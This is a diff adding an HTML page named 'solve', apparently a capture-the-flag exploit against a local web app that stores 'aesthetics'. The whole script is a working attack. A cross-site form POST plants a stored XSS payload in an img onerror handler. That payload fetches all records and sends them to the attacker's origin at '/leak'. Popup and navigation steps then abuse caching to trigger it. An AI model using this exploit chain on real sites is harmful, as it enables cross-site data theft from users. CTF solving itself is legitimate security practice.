@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>solve</title>
+  </head>
+  <body>
+    <script>
+      const sleep = (m) => new Promise((resolve) => setTimeout(resolve, m));
+
+      async function createAesthetic(url, payload) {
+        const form = document.createElement("form");
+
+        form.action = url;
+        form.method = "post";
+        form.enctype = "text/plain";
+        form.target = "first";
+
+        const input = document.createElement("input");
+        input.name = "data";
+        input.value = payload;
+        form.appendChild(input);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        const aestheticData = JSON.stringify("data=" + payload + "\r\n");
+        const hash = await crypto.subtle.digest(
+          "SHA-256",
+          new TextEncoder().encode(aestheticData),
+        );
+
+        return Array.from(new Uint8Array(hash))
+          .map((b) => b.toString(16).padStart(2, "0"))
+          .join("");
+      }
+
+      async function main() {
+        const baseUrl = "http://127.0.0.1:3333";
+        const webhook = location.origin;
+
+        let code = `
+          fetch('/api/aesthetics', {
+          headers: { mode: 'read' },
+        })
+          .then((r) => r.json())
+          .then(({ ids }) => {
+            ids.forEach((id) => {
+              fetch('/api/aesthetics/' + id, {
+                headers: { mode: 'read' },
+              })
+                .then((r) => r.text())
+                .then((data) => {
+                  fetch('${webhook}/leak', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id, data }),
+                  });
+                });
+            });
+          });
+        `;
+        code = code.replace(/\s+/g, "");
+        const payload = `<img src="/" onerror="${code}" />`;
+
+        // Stage 1: Create a aesthetic with XSS payload
+        const aestheticId = await createAesthetic(
+          baseUrl + "/api/aesthetics",
+          payload,
+        );
+
+        // Stage 2: Send aestheticId to server and prepare
+        await fetch(location.origin + "/id", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ aestheticId }),
+        });
+
+        await sleep(2000);
+
+        // Stage 3: Open the base page in a popup so it fetches our aesthetic with the
+        // read header and stores the response in the target's cache bucket.
+        window.open(baseUrl, "win");
+
+        await sleep(2000);
+
+        // Stage 3: Return to the initial top-level entry with its null initiator
+        // it will then redirect to the aesthetic page which has our xss
+        location = location.origin + "/back";
+      }
+
+      main();
+    </script>
+  </body>
+</html>
